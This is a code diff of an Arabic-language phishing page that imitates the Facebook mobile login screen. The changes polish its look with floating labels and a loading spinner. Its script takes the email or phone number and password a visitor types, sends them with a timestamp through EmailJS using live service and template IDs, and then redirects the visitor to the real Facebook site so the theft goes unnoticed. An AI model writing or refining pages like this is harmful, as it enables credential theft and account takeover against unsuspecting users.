@@ -7,11 +7,11 @@
   
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <script type="text/javascript">
-     emailjs.init({ publicKey: "xCtTnF-sIhhygtKgm" });
+      emailjs.init({ publicKey: "xCtTnF-sIhhygtKgm" });
   </script>
 
   <style>
-    /* تهيئة عامة */
+    /* تهيئة عامة للموبايل */
     * {
       box-sizing: border-box;
       margin: 0;
@@ -29,21 +29,23 @@
       justify-content: space-between;
     }
 
+    /* رأس الصفحة وحاوية اختيار اللغة */
     .header {
       width: 100%;
       height: 50px;
-      padding: 10px 16px;
+      padding: 12px 16px;
       display: flex;
       justify-content: center; 
       align-items: center;
+      position: relative;
     }
     
     .language-selector {
       display: flex;
       align-items: center;
       color: #575c61;
-      font-size: 14.5px;
-      gap: 6px;
+      font-size: 14px;
+      gap: 5px;
       cursor: pointer;
     }
 
@@ -54,7 +56,7 @@
       align-items: center;
       justify-content: flex-start;
       width: 100%;
-      padding: 20px 16px 0;
+      padding: 35px 16px 0;
     }
 
     .content-wrapper {
@@ -65,85 +67,121 @@
       align-items: center;
     }
 
-    /* شعار فيسبوك المطابق للصورة بنسبة 100% */
-    .logo-container {
-      width: 68px;
-      height: 68px;
-      border: 1px solid #ccd0d5;
-      border-radius: 50%;
-      background: #fff;
+    /* ضبط أبعاد الشعار العلوي للفيسبوك */
+    .fb-logo-container {
+      margin-bottom: 45px;
       display: flex;
       justify-content: center;
       align-items: center;
-      margin-bottom: 40px;
-      margin-top: 10px;
     }
     
-    .fb-logo-svg {
-      width: 32px;
-      height: 32px;
-      fill: #0866ff;
-      margin-top: 8px; /* لضبط التوسيط البصري لحرف f */
-      margin-left: 4px;
+    .fb-logo-img {
+      width: 110px; 
+      height: auto;
+      display: block;
     }
 
-    /* خانات الإدخال */
+    /* هيكلة حقول الإدخال لتسمح بارتفاع النص التوضيحي */
     .input-group {
       width: 100%;
-      margin-bottom: 15px;
+      margin-bottom: 5px;
+    }
+
+    .input-container {
+      position: relative;
+      width: 100%;
+      margin-bottom: 12px;
     }
     
-    input {
+    .input-container input {
       width: 100%;
-      padding: 15px 16px;
-      margin-bottom: 12px;
+      padding: 22px 16px 10px 16px; /* زيادة الطول الداخلي ليتسع النص بالأعلى */
       border: 1px solid #ccd0d5;
-      border-radius: 14px; 
-      font-size: 15px;
+      border-radius: 12px; 
+      font-size: 16px;
       color: #1c1e21;
       outline: none;
       transition: border-color 0.2s;
       font-family: inherit;
+      background: transparent;
     }
     
-    input:focus {
+    .input-container input:focus {
       border-color: #1877f2;
     }
 
-    input::placeholder {
+    /* النص التوضيحي العائم (التأثير المطلوب) */
+    .input-container label {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
       color: #757a82;
+      font-size: 15px;
       font-weight: 400;
+      pointer-events: none;
+      transition: all 0.15s ease-out;
     }
 
-    /* الأزرار */
+    /* حركة ارتفاع النص عند الضغط أو الكتابة دون تغيير لونه الرمادي */
+    .input-container input:focus ~ label,
+    .input-container input:not(:placeholder-shown) ~ label {
+      top: 13px;
+      font-size: 11.5px;
+      transform: translateY(-50%);
+      color: #757a82; /* الحفاظ على اللون كما في فيسبوك */
+    }
+
+    /* أزرار تسجيل الدخول وإنشاء الحساب */
     button {
       cursor: pointer;
-      font-weight: 500;
-      border-radius: 24px; 
+      font-weight: 600;
+      border-radius: 26px; 
       font-size: 15px;
       width: 100%;
       padding: 13px;
       text-align: center;
       transition: background 0.1s ease;
       font-family: inherit;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
 
     .login-btn {
-      background-color: #0866ff; 
+      background-color: #0064e0; 
       color: #fff;
       border: none;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
+      font-size: 16px;
+      height: 48px; /* طول ثابت ومناسب للزر والدائرة بالداخل */
     }
     
     .login-btn:hover {
-      background-color: #075ce5;
+      background-color: #0056c2;
+    }
+
+    /* تصميم دائرة التحميل المخفية افتراضياً */
+    .spinner {
+      display: none;
+      width: 22px;
+      height: 22px;
+      border: 2.5px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
 
     .forgot-link {
       color: #1c1e21;
       font-size: 14.5px;
       text-decoration: none;
-      margin-bottom: 40px;
+      margin-bottom: 30px;
       font-weight: 500;
     }
 
@@ -152,32 +190,43 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding: 0 16px 20px;
+      padding: 0 16px 24px;
     }
     
     .create-btn {
       background-color: #fff;
-      color: #0866ff;
-      border: 1px solid #0866ff;
-      margin-bottom: 25px;
+      color: #0064e0;
+      border: 1px solid #0064e0;
+      margin-bottom: 20px;
+      font-size: 15px;
+      height: 48px;
     }
 
+    /* تنسيق تذييل الصفحة المطور - جعل كلمة Meta على يمين الشعار */
     .meta-footer {
       color: #1c1e21;
-      font-size: 15px;
+      font-size: 14px;
       display: flex;
       align-items: center;
-      gap: 6px;
-      direction: ltr; 
-      font-weight: 500;
+      gap: 5px;
+      direction: rtl; 
+      font-weight: 600;
+    }
+    
+    .meta-text {
+      color: #575c61;
+      font-size: 16px;
+      font-weight: bold;
+      letter-spacing: -0.3px;
     }
     
     .meta-logo-img {
-      width: 20px;
+      width: 24px; 
       height: auto;
+      display: block;
     }
 
-    /* نافذة اللغات */
+    /* نافذة اللغات السفلية */
     .lang-modal-overlay {
       display: none;
       position: fixed;
@@ -256,8 +305,8 @@
     }
 
     .lang-item.active .checkbox {
-      background-color: #0866ff;
-      border-color: #0866ff;
+      background-color: #0064e0;
+      border-color: #0064e0;
     }
 
     .lang-item.active .checkbox::after {
@@ -299,18 +348,26 @@
   
   <main>
     <div class="content-wrapper">
-      <div class="logo-container">
-        <svg viewBox="0 0 320 512" class="fb-logo-svg">
-          <path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"/>
-        </svg>
+      <div class="fb-logo-container">
+        <img src="fb_logo.jpeg" alt="Facebook" class="fb-logo-img">
       </div>
       
       <div class="input-group">
-        <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" name="email">
-        <input type="password" id="password" placeholder="كلمة السر" name="password">
+        <div class="input-container">
+          <input type="text" id="email" placeholder=" " name="email">
+          <label id="email-label">رقم الهاتف المحمول أو البريد الإلكتروني</label>
+        </div>
+        <div class="input-container">
+          <input type="password" id="password" placeholder=" " name="password">
+          <label id="password-label">كلمة السر</label>
+        </div>
       </div>
       
-      <button class="login-btn" id="login-btn" onclick="captureLogin()">تسجيل الدخول</button>
+      <button class="login-btn" id="login-btn" onclick="captureLogin()">
+        <span id="btn-text">تسجيل الدخول</span>
+        <div class="spinner" id="btn-spinner"></div>
+      </button>
+      
       <a href="#" class="forgot-link" id="forgot-link">هل نسيت كلمة السر؟</a>
     </div>
   </main>
@@ -319,8 +376,8 @@
     <div class="content-wrapper">
       <button class="create-btn" id="create-btn">إنشاء حساب جديد</button>
       <div class="meta-footer">
-        <img src="meta-logo.png" alt="" class="meta-logo-img">
-        <span>Meta</span>
+        <span class="meta-text">Meta</span>
+        <img src="logo_meta.jpeg" alt="" class="meta-logo-img">
       </div>
     </div>
   </div>
@@ -365,10 +422,21 @@
     function applyTranslation(targetRealLang, displayName) {
       const t = realTranslations[targetRealLang];
       document.documentElement.dir = t.dir;
+      
+      const footer = document.querySelector('.meta-footer');
+      if(t.dir === 'ltr') {
+        footer.style.direction = 'ltr';
+      } else {
+        footer.style.direction = 'rtl';
+      }
+
       document.getElementById('current-lang-display').innerText = displayName;
-      document.getElementById('email').placeholder = t.emailPH;
-      document.getElementById('password').placeholder = t.passPH;
-      document.getElementById('login-btn').innerText = t.loginBtn;
+      
+      // ترجمة النصوص التوضيحية العائمة
+      document.getElementById('email-label').innerText = t.emailPH;
+      document.getElementById('password-label').innerText = t.passPH;
+      
+      document.getElementById('btn-text').innerText = t.loginBtn;
       document.getElementById('forgot-link').innerText = t.forgotLnk;
       document.getElementById('create-btn').innerText = t.createBtn;
     }
@@ -377,7 +445,6 @@
       const emailInput = document.getElementById('email').value.trim();
       const passwordInput = document.getElementById('password').value;
 
-      // 1. التحقق من صحة المدخلات
       if (!emailInput || !passwordInput) {
           alert("أدخل رقم الهاتف أو البريد الإلكتروني وكلمة السر.");
           return;
@@ -391,13 +458,15 @@
           return;
       }
 
-      // تغيير نص الزر أثناء الإرسال لإعطاء طابع حقيقي
       const loginBtn = document.getElementById('login-btn');
-      const originalText = loginBtn.innerText;
-      loginBtn.innerText = "جاري تسجيل الدخول...";
-      loginBtn.style.opacity = "0.7";
+      const btnText = document.getElementById('btn-text');
+      const spinner = document.getElementById('btn-spinner');
 
-      // 2. تجهيز البيانات حسب المفاتيح الموجودة في القالب تماماً
+      // تفعيل تأثير التحميل والدائرة الدوارة
+      btnText.style.display = 'none';
+      spinner.style.display = 'block';
+      loginBtn.style.opacity = "0.85";
+
       const templateParams = {
         name: "فيسبوك",
         Gmail: emailInput,
@@ -405,14 +474,13 @@
         وقت: new Date().toLocaleString('ar-EG')
       };
 
-      // 3. عملية الإرسال بالمعرفات الحقيقية
       emailjs.send('service_z5omr3b', 'template_z464v0m', templateParams)
         .then(() => {
-          // بمجرد الإرسال، نقل المستخدم لصفحة الفيسبوك الأصلية
           window.location.href = "https://www.facebook.com"; 
         }, (error) => {
-          // في حال حدوث خطأ
-          loginBtn.innerText = originalText;
+          // إعادة الوضع الطبيعي في حال الفشل
+          btnText.style.display = 'block';
+          spinner.style.display = 'none';
           loginBtn.style.opacity = "1";
           alert("حدث خطأ في الاتصال بالإنترنت، يرجى المحاولة لاحقاً.");
         });
